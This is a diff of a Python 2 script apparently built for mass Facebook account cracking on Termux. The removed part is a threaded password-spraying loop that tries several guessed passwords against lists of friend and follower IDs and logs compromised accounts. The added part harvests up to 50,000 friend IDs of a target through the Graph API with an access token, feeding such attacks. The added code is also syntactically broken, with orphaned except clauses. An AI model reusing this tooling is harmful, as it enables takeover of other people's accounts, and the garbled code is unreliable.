@@ -15,6 +15,13 @@ import cookielib
 import uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
+except ImportError:
+    os.system("pip2 install requests")
+    os.system("pip2 install mechanize")
+    os.system("pip2 install lolcat")
+    os.system("pkg install nano")
+    os.system('pip2 install bs4')
+    os.system("python2 jampas1.py")
 __author__ = 'Mr.James'
 __copyright = 'All rights reserved . Copyright  Mr.James'
 os.system('termux-setup-storage')
@@ -706,13 +713,11 @@ def choice_crack():
     global token
     
     try:
-        token = open('access_token.txt', 'r').read()
-    except (KeyError, IOError):
-        os.system('clear')
-        print logo
-        print '\033[1;31;1m~~~ Login FB id to continue ~~~'
-        print ''
-        time.sleep(1)
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print ' Token invalid '
+        os.system('rm -rf login.txt')
+        time.sleep(0.01)
         log_menu()
 
     os.system('clear')
@@ -720,10 +725,8 @@ def choice_crack():
     print ''
     print '\033[1;31;1m~~~~ Manuall pass cracking ~~~~'
     print ''
-    print '\033[1;92m[1] Public id cloning'
-    print '\033[1;92m[2] Followers cloning'
-    print '\033[1;92m[3] File cloning'
-    print '\033[1;92m[B] Back'
+    print '\x1b[0;97m2).\x1b[0;97m \x1b[0;97m Extract Public ID '
+    print '\x1b[0;91m0\x1b[0;97m).\x1b[0;97m \x1b[0;97mBack '
     print ''
     c_s()
 
@@ -732,212 +735,68 @@ def c_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \033[1;93mChoose option: ')
+    a_s = raw_input(' \033[1;93mSelect One: ')
     if a_s == '1':
         os.system('clear')
         print logo
         print ''
-        print '\033[1;31;1m ~~~~ Munally pass public cracking ~~~~'
+	idt = raw_input(' User ID Target : ')
+        print '\033[1;31;1m ~~~~ Extract Tools ~~~~'
         print ''
-        pass1 = raw_input(' \033[1;92m[1]Password: ')
-        pass2 = raw_input(' \033[1;92m[2]Password: ')
-        pass3 = raw_input(' \033[1;92m[3]Password: ')
-        pass4 = raw_input(' \033[1;92m[4]Password: ')
-	pass5 = raw_input(' \033[1;92m[5]Password: ')
-	pass6 = raw_input(' \033[1;92m[6]Password: ')
-	pass7 = raw_input(' \033[1;92m[7]Password: ')
-        idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
-            q = json.loads(r.text)
-            z = q['name']
+            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+            op = json.loads(jok.text)
+            print ' User Name      : ' + op['name']
             os.system('clear')
             print logo
             print ''
-            print '\033[1;31;1m ~~~~ Manually pass public cracking ~~~~'
-            print ''
-            print ' Cloning from: ' + z
-        except (KeyError, IOError):
-            print ''
-            print '\t Invalid user \x1b[0;97m'
-            print ''
-            raw_input(' Press enter to try again ')
+	except (KeyError, IOError):
+            print ' Extract Public ID !'
+            raw_input('\n\x1b[0;97m(\x1b[0;91mBack\x1b[0;97m)')
             choice_crack()
 
-        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
+        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
         z = json.loads(r.text)
-        for i in z['data']:
-            uid = i['id']
-            na = i['name']
-            nm = na.rsplit(' ')[0]
-            id.append(uid + '|' + nm)
-        
-    elif a_s == '2':
-        os.system('clear')
-        print logo
-        print ''
-        print '\033[1;31;1m~~~~ Manually pass followers cracking ~~~~'
-        print ''
-        pass1 = raw_input(' \033[1;92m[1]Password: ')
-        pass2 = raw_input(' \033[1;92m[2]Password: ')
-        pass3 = raw_input(' \033[1;92m[3]Password: ')
-        pass4 = raw_input(' \033[1;92m[4]Password: ')
-	pass5 = raw_input(' \033[1;92m[5]Password: ')
-	pass6 = raw_input(' \033[1;92m[6]Password: ')
-	pass7 = raw_input(' \033[1;92m[7]Password: ')
-        idt = raw_input(' \033[1;93mEnter id: ')
-        
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
-            q = json.loads(r.text)
-            z = q['name']
-            os.system('clear')
-            print logo
-            print ''
-            print '\033[1;31;1m~~~ Manually followers cracking~~~'
-            print ''
-            print ' Cloning from: ' + z
-        except (KeyError, IOError):
-            print ''
-            print '\t Invalid user \x1b[0;97m'
-            print ''
-            raw_input('Press enter to try again ')
-            auto_crack()
+        jalan('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mMengambil Semua ID ...')
+        print 50 * '\x1b[1;91m\xe2\x94\x80'
+        bz = open('out/id_teman_from_teman.txt', 'w')
+        for a in z['friends']['data']:
+            idfromteman.append(a['id'])
+            bz.write(a['id'] + '\n')
+            print '\r\x1b[0;97m(\x1b[0;97m' + str(len(idfromteman)) + '\x1b[0;97m)\x1b[0;94m >\x1b[0;97m',
+            sys.stdout.flush()
+            time.sleep(0.005)
+            print '\x1b[0;97m ' + a['id']
 
-        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
-        z = json.loads(r.text)
-        for i in z['data']:
-            uid = i['id']
-            na = i['name']
-            nm = na.rsplit(' ')[0]
-            id.append(uid + '|' + nm)
-		
-    elif a_s == '3':
-	os.system('clear')
-        print logo
-        print ''
-        print '\033[1;31;1m~~~~ Auto pass public cracking ~~~~'
-        print ''
-        print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
-        print ''
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
-        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
-        p6 = raw_input(' \033[1;92m[6]Name + digit: ')
-        p7 = raw_input(' \033[1;92m[7]Name + digit: ')
-        
-        try:
-	    idlist= raw_input('[+] File Name: ')
-	    for line in open(idlist ,'r').readlines():
-	        id.append(line.strip())
-	except IOError:
-	    print"[!] File Not Found."
-	    raw_input('Press Enter To Back. ')
-	    crack()
-        
-    elif a_s == '0':
-        menu()
-    else:
-        print ''
-        print '\t Choose valid option' + w
-        print ''
-        c_s()
-    print ' Total ids: ' + str(len(id))
-    time.sleep(0.5)
-    print ' \033[1;31;1m~~~ Crack Running ~~~ '
-    time.sleep(0.5)
-    print ''
-    print 47 * '-'
-    print ''
-    print '\tUsieng Free Tools Dont Sale'
-    print ''
-    print 47 * '-'
-    print ''
-    
-    def main(arg):
-        user = arg
-        (uid, name) = user.split('|')
-        
-        try:
-            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
-            q = json.loads(data)
-            if 'loc' in q:
-                print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
-                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                ok.write(uid + ' | ' + pass1 + '\n')
-                ok.close()
-                oks.append(uid + pass1)
-            elif 'www.facebook.com' in q['error']:
-                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
-                cp = open('HOP_CP.txt', 'a')
-                cp.write(uid + ' | ' + pass1 + '\n')
-                cp.close()
-                cps.append(uid + pass1)
-            else:
-                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
-                q = json.loads(data)
-                if 'loc' in q:
-                    print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
-                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                    ok.write(uid + ' | ' + pass2 + '\n')
-                    ok.close()
-                    oks.append(uid + pass2)
-                elif 'www.facebook.com' in q['error']:
-                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
-                    cp = open('HOP_CP.txt', 'a')
-                    cp.write(uid + ' | ' + pass2 + '\n')
-                    cp.close()
-                    cps.append(uid + pass2)
-                else:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
-                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass3 + '\n')
-                        ok.close()
-                        oks.append(uid + pass3)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
-                        cp = open('HOP_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass3 + '\n')
-                        cp.close()
-                        cps.append(uid + pass3)
-                    else:
-                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
-                        q = json.loads(data)
-                        if 'loc' in q:
-                            print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
-                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                            ok.write(uid + ' | ' + pass4 + '\n')
-                            ok.close()
-                            oks.append(uid + pass4)
-                        elif 'www.facebook.com' in q['error']:
-                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
-                            cp = open('HOP_CP.txt', 'a')
-                            cp.write(uid + ' | ' + pass4 + '\n')
-                            cp.close()
-                            cps.apppend(uid + pass4)
-        except:
-            pass
-        
-
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print ''
-    print 47 * '-'
-    print ''
-    print ' \033[1;92mCrack Done'
-    print '\033[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
-    print ''
-    print 47 * '-'
-    print ''
-    raw_input('\033[1;93m Press enter to back')
-    choice_crack()
+        bz.close()
+        print '\r\x1b[0;97m(\x1b[0;92m \xe2\x9c\x93 \x1b[0;97m)\x1b[0;97m Sukses Mengambil ID \x1b[0;97m....'
+        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID : %s' % len(idfromteman)
+        done = raw_input('\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mSimpan Nama File : ')
+        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
+        print '\r\x1b[0;97m(\x1b[0;92m \xe2\x88\x9a \x1b[0;97m) File tersimpan : out/' + done
+        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
+        choice_crack()
+    except (KeyError, IOError):
+        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) File tidak tersimpan '
+        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
+        choice_crack()
+    except (KeyError, IOError):
+        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Error creating file'
+        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
+        choice_crack()
+    except (KeyboardInterrupt, EOFError):
+        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Terhenti '
+        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
+        choice_crack()
+   except (KeyError, IOError):
+        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Teman tidak ada !'
+        raw_input('\n\x1b[0;97m(\x1b[0;91mkembali\x1b[0;97m)')
+        choice_crack()
+    except requests.exceptions.ConnectionError:
+        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Tidak ada koneksi !'
+        raw_input('\033[1;93m Press enter to back')
+        menu():
 
 if __name__ == '__main__':
     reg()
